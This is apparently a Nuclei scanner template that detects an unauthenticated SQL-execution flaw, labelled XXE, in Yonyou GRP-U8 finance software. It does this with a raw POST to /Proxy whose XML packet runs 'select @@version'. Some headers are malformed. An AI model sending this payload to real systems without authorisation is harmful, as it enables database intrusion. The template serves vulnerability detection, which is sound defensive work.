id: proxy-xxe-upload

info:
  name: 用友GRP-U8(YONYOU) - Proxy XXE注入漏洞
  author: wintry
  severity: critical
  description: 用友GRP-U8行政事业财务管理软件存在XXE漏洞,该漏洞源于应用程序解析XML输入时没有进制外部实体的加载,导致可加载外部SQL语句,以及命令执行.
  tags: yonyougrpu8

http:
  - raw:
      - |
        POST /Proxy HTTP/1.1
        Host: {{Hostname}}
        Accept: Accept: */*
        Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host
        Content-Length: 357
        Connection: Keep-Alive
        Cache-Control: no-cache


        cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">select @@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>
        
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - '[A-F0-9]{32}'

      - type: status
        status:
          - 200